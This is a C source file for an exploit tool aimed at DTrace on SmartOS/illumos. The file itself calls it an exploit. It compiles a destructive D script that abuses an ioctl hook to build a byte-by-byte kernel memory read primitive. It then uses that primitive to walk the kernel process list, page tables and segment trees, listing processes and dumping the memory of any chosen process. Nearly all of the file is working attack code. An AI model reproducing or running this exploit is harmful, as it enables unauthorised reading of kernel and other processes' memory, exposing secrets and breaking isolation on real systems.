#define _KMEMUSER 1
#include <dtrace.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

#include <stddef.h>
#include <sys/proc.h>
#include <sys/user.h>
#include <sys/dtrace.h>
#include <vm/as.h>
#include <vm/seg.h>
#include <sys/avl.h>
#include <arpa/inet.h>

#include <errno.h>
#define        PT_PAGESIZE     (0x080)
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

#define  PT_PADDR        (0x000ffffffffff000ull)
#define  PT_PADDR_LGPG   (0x000fffffffffe000ull)
#define PTE_GET(p, f)   ((p) & (f))
#define PTE_IS_LGPG(p, l)       ((l) > 0 && PTE_GET((p), PT_PAGESIZE))
#define PTE2ADDR(p, l)   \
        (PTE_GET((p), PTE_IS_LGPG((p), (l)) ? PT_PADDR_LGPG : PT_PADDR))

#define TRACE(...) fprintf (stderr, __VA_ARGS__)

typedef struct
{
  int fds[256];
  uint64_t* patches[2];
  dof_hdr_t *dof;
  dof_hdr_t *options_dof
} dread_state;


typedef int8_t level_t;
typedef ulong_t         pfn_t;

void bail(char* error) {
  fprintf(stderr, error);
  exit(1);
}

int open_dtrace() {
  int fd = open("/dev/dtrace/dtrace", O_RDWR);
  if (fd < 0) {
    bail("failed to open dtrace\n");
  }

  return fd;
}

void enable_dof(int fd, dof_hdr_t *dof) {
    int err = ioctl(fd, DTRACEIOC_ENABLE, dof);
    if (err < 0) {
      bail("failed to enable dof\n");
    }
}


void go_dof(int fd) {
  processorid_t cpu;
  int err = ioctl(fd, DTRACEIOC_GO, &cpu);
  if (err < 0) {
    perror("failed to go");
    exit(1);
  }
}

void close_state(dread_state* state) {
  for (int i = 0; i < 256; ++i) {
    close(state->fds[i]);
  }
}

void open_state(dread_state* state) {
   for (int i = 0; i < 256; ++i) {
      int fd = open_dtrace();
      *(state->patches[0]) = i;
      *(state->patches[1]) = i;
      enable_dof(fd, state->options_dof);
      enable_dof(fd, state->dof);
      go_dof(fd);
      state->fds[i] = fd;
      fprintf(stderr, ".");
      fflush(stderr);

   }
   fprintf(stderr, "\n");
}



static int bytes_read = 0;
static int i_bytes_read[256] = {0};

void dread_with_options(dread_state* state, uintptr_t addr, void* buf, int sz, int null_stop) {
  if (addr <= 0xfffffd7fffe00000) {
    fprintf(stderr, "attempted to read bad pointer %p\n", addr);
    exit(1);
  }

  char correct[256];

  for (int i = 0; i < sz; ++i) {
    ++bytes_read;
    memset(correct, 'X', sizeof(correct));
    int found = 0;

      ioctl(666, 0xDEADBEEF, addr + i, &correct[0]);
      for (int j = 0; j < 256; ++j) {
        if (correct[j] == 1) {
          *((char*)buf + i) = (char)j;
          found = 1;
          i_bytes_read[j]++;
          if (j == 0 && null_stop == 1) {
            return;
          }
          break;
        }
      }

    if (!found) {
      fprintf(stderr, "failed to read byte: %p %d %d\n", addr + i, bytes_read, i_bytes_read[0]);
      close_state(state);
      open_state(state); /* state is fucked up reset it */
      --i;
    }

  }
 }


void dread_string(dread_state* state, uintptr_t addr, void* buf, int sz) {
  dread_with_options(state, addr, buf, sz, 1);
}

void dread(dread_state* state, uintptr_t addr, void* buf, int sz) {
  dread_with_options(state, addr, buf, sz, 0);
}

void dread_non_fatal(dread_state* state, uintptr_t addr, void* buf, int sz) {
  dread_with_options(state, addr, buf, sz, 0);
}

int overlaps(uintptr_t l, size_t ls, uintptr_t r, size_t rs) {
  return l <= (r + rs) && r <= (l + ls);
}

void walknodes(dread_state* fd, uintptr_t p_brkbase, size_t p_brksize, size_t offset, uintptr_t node_ptr) {
  struct avl_node node;
  dread(fd, node_ptr, &node, sizeof(node));

  struct seg seg;
  dread(fd, node_ptr - offset, &seg, sizeof(seg));

  int is_heap = overlaps(p_brkbase, p_brksize, (uintptr_t)seg.s_base, seg.s_size);
  printf("SEGMENT: 0x%p %lu %s \n", seg.s_base, seg.s_size, is_heap ? "[heap]" : "");

  if (node.avl_child[0] != NULL) {
    walknodes(fd, p_brkbase, p_brksize, offset, (uintptr_t)node.avl_child[0]);
  }

  if (node.avl_child[1] != NULL) {
    walknodes(fd, p_brkbase, p_brksize, offset, (uintptr_t)node.avl_child[1]);
  }
}

void resolve_type(dtrace_hdl_t* handle, dtrace_typeinfo_t* type, char *name) {
    int n = dtrace_lookup_by_type(handle, DTRACE_OBJ_KMODS, name, type);
    if (n < 0) {
      fprintf(stderr, "failed to lookup type: %s\n", name);
      exit(1);
    }
}
/* smartos is so nice to write exploits on. all offsets and shit are in some DB where the function
 * calls start with ctf_*. capture-the-flag?. is this some kind of troll function naming */
ulong_t resolve_offset(dtrace_hdl_t* handle, char* name, char* member) {
    dtrace_typeinfo_t tip;

    resolve_type(handle, &tip, name);
    ctf_membinfo_t member_info;
    int n = ctf_member_info(tip.dtt_ctfp, tip.dtt_type, member, &member_info);
    if (n < 0) {
      fprintf(stderr, "failed to resolve member: %s\n", member);
      exit(1);
    }

    if (member_info.ctm_offset % 8 != 0) {
      bail("offset not byte aligned\n");
    }
    return member_info.ctm_offset / 8;
}

ssize_t type_size(dtrace_hdl_t* handle, char* name) {
  dtrace_typeinfo_t tip;
  resolve_type(handle, &tip, name);
  return ctf_type_size(tip.dtt_ctfp, tip.dtt_type);
}

uintptr_t resolve_symbol(dtrace_hdl_t* handle, char* name) {
    GElf_Sym symbol;

    int n = dtrace_lookup_by_name(handle,DTRACE_OBJ_KMODS, name, &symbol, NULL);
    if (n < 0) {
      bail("failed to lookup\n");
    }

    return symbol.st_value;
}

#define HTABLE_HASH(hat, va, lvl,hat_num_hash, level_shift1)                                       \
        ((((va) >> level_shift1) + ((va) >> 28) + (lvl) +             \
        ((uintptr_t)(hat) >> 4)) & (hat_num_hash - 1))

/* define HTABLE_NUM_PTES(ht)     (((ht)->ht_flags & HTABLE_VLP) ? 4 : 512) */
#define HTABLE_NUM_PTES (512)

struct memory_info {

  uint_t max_level;
  uint_t mmu_pte_size_shift;
  uint_t num_hash;
  uint_t _mmu_pageshift;
  caddr_t kpm_base;
  size_t level_mask_offset;
  size_t level_shift_offset;
  uint_t level_shift1;
  uintptr_t hat_ht_hash;

  size_t ht_hat_offset;
  size_t ht_vaddr_offset;
  size_t ht_level_offset;
  size_t ht_next_offset;
  size_t ht_pfn_offset;

  ssize_t htable_t_size;

  uintptr_t mmu;
  uint_t max_page_level;
  ulong_t page_mask;

  uintptr_t kpm_vbase;
};

void load_memory_info(dtrace_hdl_t* handle, dread_state* fd, uintptr_t hat, struct memory_info* info) {

    info->mmu = resolve_symbol(handle, "mmu");
    uintptr_t mmu = info->mmu;

    dread(fd, mmu + resolve_offset(handle, "struct hat_mmu_info", "max_page_level"), &info->max_page_level, sizeof(info->max_page_level));

    dread(fd, resolve_symbol(handle, "_mmu_pagemask"), &info->page_mask, sizeof(info->page_mask));

    dread(fd, mmu + resolve_offset(handle, "struct hat_mmu_info", "max_level"), &info->max_level, sizeof(info->max_level));
    dread(fd, mmu + resolve_offset(handle, "struct hat_mmu_info", "pte_size_shift"), &info->mmu_pte_size_shift, sizeof(info->mmu_pte_size_shift));
    dread(fd, hat + resolve_offset(handle, "struct hat", "hat_num_hash"), &info->num_hash, sizeof(info->num_hash));
    dread(fd, resolve_symbol(handle, "_mmu_pageshift"), &info->_mmu_pageshift, sizeof(info->_mmu_pageshift));
    dread(fd, resolve_symbol(handle, "kpm_vbase"), &info->kpm_vbase, sizeof(info->kpm_vbase));


    info->level_mask_offset = resolve_offset(handle, "struct hat_mmu_info", "level_mask");
    info->level_shift_offset = resolve_offset(handle, "struct hat_mmu_info", "level_shift");

    dread(fd, mmu + info->level_shift_offset + sizeof(info->level_shift1) * 1, &info->level_shift1, sizeof(info->level_shift1));
    dread(fd, hat + resolve_offset(handle, "struct hat", "hat_ht_hash"), &info->hat_ht_hash, sizeof(info->hat_ht_hash));

    info->htable_t_size = type_size(handle, "struct htable");

    info->ht_hat_offset = resolve_offset(handle, "struct htable", "ht_hat");
    info->ht_vaddr_offset = resolve_offset(handle, "struct htable", "ht_vaddr");
    info->ht_level_offset = resolve_offset(handle, "struct htable", "ht_level");
    info->ht_next_offset = resolve_offset(handle, "struct htable", "ht_next");
    info->ht_pfn_offset = resolve_offset(handle, "struct htable", "ht_pfn");


}


uintptr_t htable_lookup(dtrace_hdl_t* handle, dread_state* fd, uintptr_t hat, uintptr_t vaddr, level_t level, struct memory_info* info) {
    TRACE("hat: %p\n", hat);
    uintptr_t base;
    if (level == info->max_level) {
      base = 0;
    } else {
      uintptr_t level_mask;
      dread(fd, info->mmu + info->level_mask_offset + sizeof(uintptr_t) * (level + 1), &level_mask, sizeof(level_mask));

      TRACE("using level mask: %p old base: %p\n", level_mask, base);
      base = vaddr & level_mask;
      TRACE("new base: %p\n", base);

    }


    uint_t hash_val = HTABLE_HASH(hat, base, level, info->num_hash, info->level_shift1);


    TRACE("hashval %p\n", hash_val);
    TRACE("reading address: %p hat_ht_hash: %p\n", info->hat_ht_hash + sizeof(uintptr_t) * hash_val, info->hat_ht_hash);

    uintptr_t ht;
    dread(fd, info->hat_ht_hash + sizeof(uintptr_t) * hash_val, &ht, sizeof(ht));

    uintptr_t pa = 0;
    while (ht != 0) {
      char htable_t[info->htable_t_size];
      dread(fd, ht, &htable_t, info->htable_t_size);

      uintptr_t ht_hat = *(uintptr_t*)&htable_t[info->ht_hat_offset];
      uintptr_t ht_vaddr = *(uintptr_t*)&htable_t[info->ht_vaddr_offset];
      uint8_t ht_level = *(uint8_t*)&htable_t[info->ht_level_offset];
      uintptr_t ht_next = *(uintptr_t*)&htable_t[info->ht_next_offset];

      TRACE("vaddr: %p ht_hat: %p ht_vaddr: %p ht_level: %d ht_next: %p\n", base, ht_hat, ht_vaddr, ht_level, ht_next);
      if (ht_hat == hat && ht_vaddr == base && ht_level == level) {
        pfn_t pfn = *(pfn_t*)&htable_t[info->ht_pfn_offset];
        TRACE("found pfn: %d\n", pfn);

        uint_t level_shift;
        dread(fd, info->mmu + info->level_shift_offset + sizeof(level_shift) * ht_level, &level_shift, sizeof(level_shift));
        uint_t entry = (vaddr >> level_shift) &  (HTABLE_NUM_PTES -1);
        TRACE("found entry: %d level_shift: %d\n", entry, level_shift);
        TRACE("kpm_vbase: %p _mmu_pageshift: %d mmu_pte_size_shift: %d vaddr: %p\n", info->kpm_vbase,  info->_mmu_pageshift, info->mmu_pte_size_shift, vaddr);
        uintptr_t pte;
        dread(fd, info->kpm_vbase + (pfn << info->_mmu_pageshift) + (entry << info->mmu_pte_size_shift), &pte, sizeof(pte));

        TRACE("pte is %p \n", pte);
        pa = PTE2ADDR(pte, ht_level);
        TRACE("pa is %p\n", pa);
        break;
      }
      ht = ht_next;
    }

    return pa;

}

uintptr_t lookup_each_level(dtrace_hdl_t *handle, int fd, uintptr_t hat, uintptr_t vaddr, struct memory_info* memory_info) {
    vaddr = vaddr & memory_info->page_mask;

    for (int l = 0; l <= memory_info->max_page_level; ++l) {
      uintptr_t pa = htable_lookup(handle, fd, hat, vaddr, l, memory_info);
      if (pa != NULL) {
        return pa;
      }
    }

    return NULL;

}


void dump_memory(dtrace_hdl_t *handle, dread_state* fd, uintptr_t process, uintptr_t vaddr, size_t size) {

  uintptr_t p_as;
  dread(fd, process + offsetof(proc_t, p_as), &p_as, sizeof(p_as));

  struct  as as;

  dread(fd, p_as, &as, sizeof(as));

  TRACE("using as: %p\n", p_as);

  struct memory_info memory_info;
  load_memory_info(handle, fd, as.a_hat, &memory_info);

  size_t pagesize = getpagesize();
  size_t amount_read = 0;
  int reads = (size  + pagesize - 1) / pagesize;
  char buffer[pagesize];

  for (int i = 0; i < reads; ++i) {
    size_t offset = (vaddr & (pagesize - 1));
    size_t amount_to_read = MIN(pagesize - offset, size - amount_read);

    uintptr_t pa = lookup_each_level(handle, fd, as.a_hat, vaddr, &memory_info);
    if (pa == 0) {
      fprintf(stderr, "failed to find mapping for vaddr: %p\n", vaddr);
    } else {
      uintptr_t real_addr = pa + offset;
      uintptr_t virtual_addr = memory_info.kpm_vbase + real_addr;


      TRACE("reading %d from %p (%p)\n", amount_to_read, real_addr, virtual_addr);

      dread(fd, virtual_addr, &buffer, amount_to_read);
      if (amount_to_read != write(1, buffer, amount_to_read)) {
        bail("failed to write to stdout\n");
      }
    }

    vaddr += amount_to_read;
    amount_read += amount_to_read;
  }



}

void walk_procs(dtrace_hdl_t *handle, dread_state* fd, void (*callback)(dtrace_hdl_t*, int, uintptr_t process_ptr, pid_t, void*), void* data) {

    uintptr_t practive = resolve_symbol(handle, "practive");
    uintptr_t process_ptr;
    dread(fd, (void*)practive, &process_ptr, sizeof(process_ptr));

    while (process_ptr != 0) {


      uintptr_t ppid_ptr;
      dread(fd, process_ptr + offsetof(proc_t, p_pidp), &ppid_ptr, sizeof(ppid_ptr));

      pid_t pid;
      dread(fd, ppid_ptr + offsetof(struct pid, pid_id), &pid, sizeof(pid));

      callback(handle, fd, process_ptr, pid, data);
      uintptr_t p_next;
      dread(fd, process_ptr + offsetof(proc_t, p_next), &p_next, sizeof(void*));

      process_ptr = p_next;
    }
}

struct find_proc {
  pid_t pid;
  int found;
  uintptr_t process;
};

void find_proc(dtrace_hdl_t * handle, int fd, uintptr_t process, pid_t pid, void* data) {
  struct find_proc* find = data;
  if (pid == find->pid) {
    find->found = 1;
    find->process = process;
  }
}

void dump_process(dtrace_hdl_t * handle, int fd, uintptr_t process, pid_t pid, void* data) {

  uintptr_t brkbase;
  dread(fd, process + offsetof(proc_t, p_brkbase), &brkbase, sizeof(void*));

  char    u_comm[MAXCOMLEN + 1];
  dread_string(fd, process + offsetof(proc_t, p_user) + offsetof(user_t, u_comm), &u_comm, sizeof(u_comm));
  char    u_psargs[PSARGSZ];
  dread_string(fd, process + offsetof(proc_t, p_user) + offsetof(user_t, u_psargs), &u_psargs, sizeof(u_psargs));

  printf("%d %s %s %p\n", pid, u_comm, u_psargs, brkbase);

}

void dump_segments(dtrace_hdl_t * handle, dread_state* fd, uintptr_t process) {

      uintptr_t p_as;
      dread(fd, process + offsetof(proc_t, p_as), &p_as, sizeof(p_as));


      avl_tree_t a_segtree;
      dread(fd, p_as + offsetof(struct as, a_segtree), &a_segtree, sizeof(a_segtree));

      uintptr_t p_brkbase;
      dread(fd, process + offsetof(proc_t, p_brkbase), &p_brkbase, sizeof(p_brkbase));

      size_t p_brksize;
      dread(fd, process + offsetof(proc_t, p_brksize), &p_brksize, sizeof(p_brksize));

      walknodes(fd, p_brkbase, p_brksize, a_segtree.avl_offset, a_segtree.avl_root);
}

void print_usage(char** argv) {
  fprintf(stderr, "Usage: %s [ps|segment|dump] -p pid -a addr (hex) -s size (decimal)\n", argv[0]);
}

#define PS 1
#define SEGMENT 2
#define DUMP 3

void init_dread_state(dtrace_hdl_t *handle, dread_state* state) {



    (void) dtrace_setopt(handle, "bufsize", "1024");
    (void) dtrace_setopt(handle, "aggsize", "1024");
    (void) dtrace_setopt(handle, "temporal", "yes");
    (void) dtrace_setopt(handle, "dynvarsize", "36");
    (void) dtrace_setopt(handle, "destructive", "yes");


   char* buf = "char buf[1]; char result[1]; BEGIN { buf[0] = 0xff, x[1,buf]=\"x\",addr = &x[1,buf][0],addr -= 0x28; } syscall::ioctl:entry / arg1 == 0xDEADBEEF && execname == \"global_ps3\" / {   *(void**)addr = (void*)arg2, new_addr = &x[1,buf][0], result[0] = 0, result[0] = ((new_addr == 0) ? 0 : 1), copyout(&result[0], arg3 + 0xff, sizeof(char)); }";
   dtrace_prog_t *prog = dtrace_program_strcompile(handle,
      buf,
      DTRACE_PROBESPEC_NAME, 0, 0, NULL);

   if (prog == NULL) {
     fprintf(stderr, "%s\n", dtrace_errmsg(handle, 1005));
     bail("failed to compile prog\n");
   }

   dof_hdr_t *dof = dtrace_dof_create(handle, prog, DTRACE_D_STRIP);

   if (dof == NULL) {
      bail("failed to create dof\n");
   }

   int patch_count = 0;

   dof_sec_t *section = ((char*)dof + dof->dofh_secoff);
   for (int i = 0; i < dof->dofh_secnum; ++i) {
     void* section_data = (char*) dof + section->dofs_offset;


     if (section->dofs_type == DOF_SECT_INTTAB) {
       int sz = section->dofs_size / sizeof(uint64_t);
       for (int j = 0; j < sz; ++j) {

         if (((uint64_t*)section_data)[j] == 0xff) {
           state->patches[patch_count++] = &((uint64_t*)section_data)[j];
         }
       }
     }
     section += 1;
   }


   state->options_dof = dtrace_getopt_dof(handle);
   state->dof = dof;

   open_state(state);
}

int main(int argc, char** argv) {

    char** orig_argv = argv;

    int mode = PS;
    int has_command = 0;

    if (argc >= 2) {
      char* command = argv[1];
      if (!strcmp(command, "ps")) {
        mode = PS;
        has_command = 1;
      } else if (!strcmp(command, "segment")) {
        mode = SEGMENT;
        has_command = 1;
      } else if (!strcmp(command, "dump")) {
        mode = DUMP;
        has_command = 1;
      }
    }

    if (has_command) {
      argc--;
      argv++;
    }


    int option;
    pid_t pid = -1;
    uintptr_t addr;
    size_t size;
    int has_size = 0;
    int has_addr = 0;
    char* invalid = NULL;

    if (mode == DUMP) {
      while ((option = getopt(argc, argv,"p:a:s:")) != -1) {
        switch (option) {
          case 'p':
            pid = atoi(optarg);
            break;
          case 'a':
            errno = 0;
            addr = strtoul(optarg, &invalid, 16);
            if (errno != 0 || *invalid != '\0') {
              print_usage(orig_argv);
              exit(1);
            }
            has_addr = 1;
            break;
          case 's':
            size = atol(optarg);
            has_size = 1;
            break;
          default:
            break;
         }
       }
       if (!has_addr || !has_size || pid == -1) {
         print_usage(orig_argv);
         exit(1);
       }
    }

    if (mode == SEGMENT) {
      while ((option = getopt(argc, argv,"p:")) != -1) {
        switch (option) {
          case 'p':
            pid = atoi(optarg);
            break;
        }
      }

      if (pid == -1) {
        print_usage(orig_argv);
        exit(1);
      }
    }

    int err;
    dtrace_hdl_t *handle = dtrace_open(DTRACE_VERSION, 0, &err);
    if (!handle) {
      fprintf(stderr, "err opening dtrace: %d\n", err);
      exit(1);
    }

    dread_state state;
    init_dread_state(handle, &state);




    if (mode == SEGMENT || mode == DUMP) {
      struct find_proc find;
      find.found = 0;
      find.pid = pid;
      find.process = 0;
      walk_procs(handle, &state, find_proc, &find);
      if (find.found) {
        if (mode == SEGMENT) {
          dump_segments(handle, &state, find.process);
        } else {
          dump_memory(handle, &state, find.process, addr, size);
        }
      } else {
        fprintf(stderr, "Failed to find pid: %d\n", pid);
        exit(1);
      }
    } else {
      printf("PID COMMAND PSARGS BRKBASE\n");
      walk_procs(handle, &state, &dump_process, NULL);
    }

}
